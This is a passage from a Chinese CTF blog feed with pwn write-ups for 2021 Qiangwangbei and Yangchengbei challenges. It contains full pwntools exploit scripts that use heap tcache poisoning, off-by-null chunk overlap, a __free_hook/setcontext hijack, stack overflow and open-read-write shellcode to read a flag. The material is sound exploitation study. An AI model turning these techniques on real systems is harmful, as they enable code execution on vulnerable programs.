rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;47.104.175.110&quot;,61608)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;input context:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;input index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>, <span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+ <span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap = leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr = leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+ <span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(<span class="hljs-number">5</span>, payload)<br><br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base+libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#control regs</span><br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <span class="hljs-comment">#shellcode</span><br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br>	<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="easy-vm"><a href="#easy-vm" class="headerlink" title="easy_vm"></a>easy_vm</h2><p>以后学到了，再回来复现（可能是近期 吧，近期决定爆肝学习，希望能）</p>
]]></content>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>ptmalloc--笔记</title>
    <url>/2021/09/17/2021-09-17-ptmalloc-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该篇博客是学习《glibc内存管理ptmalloc源代码分析@华庭》时，边学边记录的一些零散知识点，以及可能会有的一些粗浅的个人见解，或者因某些知识产生的问题与思考</p>
<h2 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h2><p>1、</p>
<h2 id="个人问题与个人解答"><a href="#个人问题与个人解答" class="headerlink" title="个人问题与个人解答"></a>个人问题与个人解答</h2>]]></content>
      <tags>
        <tag>ptmalloc</tag>
      </tags>
  </entry>
  <entry>
    <title>2021强网杯PWN</title>
    <url>/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/</url>
    <content><![CDATA[<p>复现来源：</p>
<p><a href="https://blog.csdn.net/eeeeeight/article/details/118006138">https://blog.csdn.net/eeeeeight/article/details/118006138</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1839670">https://cloud.tencent.com/developer/article/1839670</a></p>
<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914154341329.png"><span class="image-caption">image-20210914154341329</span></p>
<p>checksec一下，64位，堆栈可执行</p>
<p>进入IDA，只存在申请和释放堆块的功能，其中，申请最多两次，释放只有一次。</p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155156145.png"><span class="image-caption">image-20210914155156145</span></p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155132957.png"><span class="image-caption">image-20210914155132957</span></p>
<p>首先，没有检查索引下限，所以存在数组越界，可以越界到got表。然后输入函数中，如果我们在输入size时，直接输入’\n’，将会让size直接为0，而如果size为0了，在往堆里面输入数据是就可以无限输入，因为在检验那里，buf一旦获得跟ptr一样的地址，而buf又要先自加，才就会导致一直都将大于ptr，验证一直都是没有问题的</p>
<p><img src="/2021/09/14/2021-09-14-2021%E5%BC%BA%E7%BD%91%E6%9D%AFPWN/image-20210914155508246.png"><span class="image-caption">image-20210914155508246</span></p>
<p>程序有沙箱，所以就是orw。加上前面发现的漏洞点，结合起来就是，通过数组越界，将堆块指针写入到函数的got表里面，然后因为无限输入，堆块又可执行，所以往堆块里面写入shellcode，最后就是调用被修改函数，转而去执行shellcode来读取flag</p>
<p>然后呢，本地复现不了，暂时不知道该怎么让文件去链接上题目给的seccomp文件，所以只能讲讲思路</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#sh=process(&#x27;./orw&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>libc=elf.libc<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span>():</span><br>    shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    xor rdi, rdi</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    mov rdi, 0x67616c662f2e</span><br><span class="hljs-string">    push rdi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdx, 0x100</span><br><span class="hljs-string">    mov rsi, rdi</span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    mov rax, 0</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;index:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;-25&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;size:&#x27;</span>)<br>    sh.sendline(<span class="hljs-string">&#x27;&#x27;</span>)<br>    sh.recvuntil(<span class="hljs-string">&#x27;content:&#x27;</span>)<br>    sh.sendline(asm(shellcode))<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.recv()<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.interactive()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        sh=process(<span class="hljs-string">&#x27;./orw&#x27;</span>)<br>        sh=remote(<span class="hljs-string">&#x27;39.105.131.68&#x27;</span>,<span class="hljs-number">12354</span>)<br>   <span class="hljs-keyword">try</span>:<br>            pwn()<br>        <span class="hljs-keyword">except</span>:<br>            sh.close()<br></code></pre></td></tr></table></figure>

<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <tags>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2021羊城杯PWN</title>
    <url>/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛，我能做的应该是有三题的，可能还是太菜了，比赛时就是没出，最终只做了个签到题，还好手快抢了一血，长路漫漫，继续加油吧！</p>
<p>复现来源：<a href="https://blog.csdn.net/eeeeeight/article/details/120255533">https://blog.csdn.net/eeeeeight/article/details/120255533</a></p>
<h2 id="BabyRop"><a href="#BabyRop" class="headerlink" title="BabyRop"></a>BabyRop</h2><p>这题签到题，很简单的栈溢出，没什么好讲的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span>*<br><br>p=remote(<span class="hljs-string">&#x27;192.168.39.50&#x27;</span>,<span class="hljs-number">11000</span>)<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p.recvuntil(&quot;Input:\n&quot;)</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">0x2c</span> + p32(<span class="hljs-number">0x80490a0</span>) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0x0804c029</span>)<br>p.sendline(payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="nologin"><a href="#nologin" class="headerlink" title="nologin"></a>nologin</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913165518141.png"><span class="image-caption">image-20210913165518141</span></p>
<p>常规checksec，64位，保护基本没开，存在可执行段，这种一般就是注入shellcode去执行的</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170209042.png"><span class="image-caption">image-20210913170209042</span></p>
<p>同时，当你执行到admin功能时，会开启沙箱，禁用了execve，所以这题就变成了orw了。admin功能是必须要进的，因为这里才存在着漏洞——栈溢出</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170334228.png"><span class="image-caption">image-20210913170334228</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170528035.png"><span class="image-caption">image-20210913170528035</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913170611997.png"><span class="image-caption">image-20210913170611997</span></p>
<p>buf这里可以写入30个字节的内容，所以可以覆盖到返回地址，但是具体的长度要动态去看。我这边是进入到了admin功能中，可以看见，前五个字节是用来对齐栈内容，接下来的八个字节就可以覆盖rbp内容，这边覆盖的是admin中输入函数的rbp</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913171057369.png"><span class="image-caption">image-20210913171057369</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221356910.png"><span class="image-caption">image-20210913221356910</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221754144.png"><span class="image-caption">image-20210913221754144</span></p>
<p>并且呢，.bss是属于可执行段的，先覆盖返回地址去执行read函数，因为read是有三个参数的，但是我们可以观察当执行read函数时，三个参数都是已经满足了的（因为我们刚开始就借着read函数的溢出，并且寄存器并未被改变）。所以写入数据的地方是栈上一个地址，所以先构造一次shellcode（注意shellcode大小，因为长度最多为0x1d）系统调用read函数，往.bss上写第二个shellcode，这次shellcode的长度一定要够大，不然写不下。最后就是在.bss上写最终的orw，读取flag即可</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913211252996.png"><span class="image-caption">image-20210913211252996</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>context.binary = elf<br>p = process(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>call_rsi = <span class="hljs-number">0x000000000040186b</span><br>read = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000401007&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;password: &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x602030</span>+<span class="hljs-number">0x28</span>)+ p64(read) + p64(call_rsi)<br>p.sendline(payload)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              xor rax, rax;</span><br><span class="hljs-string">              push r11;</span><br><span class="hljs-string">              pop rdx;</span><br><span class="hljs-string">              mov rsi, 0x602100;</span><br><span class="hljs-string">              syscall;</span><br><span class="hljs-string">              add rsi, 28;</span><br><span class="hljs-string">              jmp rsi;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br>p.sendline(shellcode)<br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rax, 2;</span><br><span class="hljs-string">               sub rsi, 16;</span><br><span class="hljs-string">               mov rdi, rsi;</span><br><span class="hljs-string">               xor rsi, rsi;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string"></span><br><span class="hljs-string">               mov rdi, rax;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rsi, 0x602300;</span><br><span class="hljs-string">               mov rdx, 0x80;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               </span><br><span class="hljs-string">               mov rax, 1;</span><br><span class="hljs-string">               mov rdi, 1;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode1))<br>p.sendline(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">11</span> + <span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span>*<span class="hljs-number">3</span> + shellcode1)<br>p.interactive() <br></code></pre></td></tr></table></figure>

<h2 id="Whats-your-name"><a href="#Whats-your-name" class="headerlink" title="Whats your name"></a>Whats your name</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204918588.png"><span class="image-caption">image-20210923204918588</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083229104.png"><span class="image-caption">image-20210924083229104</span></p>
<p>add里面，会先申请一块0x10大小的堆块，然后在前八字节作为函数指针存放puts地址，后八字节存放一个大小在0~0x100之间的堆块地址，最多能申请出10个堆块<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083439735.png"><span class="image-caption">image-20210924083439735</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083201516.png"><span class="image-caption">image-20210924083201516</span></p>
<p>在edit里面，写入函数会堆溢出一个0，漏洞点offbynull</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083514708.png"><span class="image-caption">image-20210924083514708</span></p>
<p>show里面，调用之前存放的函数指针，打印堆块内容</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083618714.png"><span class="image-caption">image-20210924083618714</span></p>
<p>释放堆块，全部置0</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083715443.png"><span class="image-caption">image-20210924083715443</span></p>
<p>最后，程序开了沙箱，看来是要orw了</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204552633.png"><span class="image-caption">image-20210923204552633</span></p>
<p>这是什么都没做的情况，由于开启沙箱都是会这样的出现很多的堆块，里面有一块是unsorted chunk，给他申请回来，里面就已经存放着脏数据了，直接就能泄露libc。同样也能泄露出堆上地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924092730279.png"><span class="image-caption">image-20210924092730279</span></p>
<p>我们要利用offbynull，肯定是要制造出堆块重叠的，那么就一定要让堆块是连续的，所以不能是上面bin链存在的大小，并且offbynull，那溢出被覆盖为0的肯定是0xf0的堆块<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093026970.png"><span class="image-caption">image-20210924093026970</span></p>
<p>这是连续申请出来的四个堆块，全都连在了一起，才方便我们后续制造堆块重叠</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093202818.png"><span class="image-caption">image-20210924093202818</span></p>
<p>通过offbynull，成功将in_use位置为0</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924094657672.png"><span class="image-caption">image-20210924094657672</span></p>
<p>然后释放堆块，触发合并</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924195657525.png"><span class="image-caption">image-20210924195657525</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200058670.png"><span class="image-caption">image-20210924200058670</span></p>
<p>然后再把0xf0堆块申请回来，接着我们申请在bin有的堆块，因为再分配就是要重叠在之前未被释放的0x40的堆块上了，而我们要和这个堆块重叠的要选择那个程序帮我们申请的堆块，因为控制这个堆块是可以借着edit功能执行任意地址写的，或者在show功能里面获得执行权限，可谓好处多多</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure>

<p>到现在，所有的铺垫都已经准备好了，接着先计算一下我们需要的gadget，以及rop的地址计算，以及flag地址的排布</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200749914.png"><span class="image-caption">image-20210924200749914</span></p>
<p>把flag字符串写到前面我们申请的1堆块上，可以直接用搜索功能，更快点，rop的地址要后面申请出写的堆块再回来算的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924202223468.png"><span class="image-caption">image-20210924202223468</span></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924211125389.png"><span class="image-caption">image-20210924211125389</span></p>
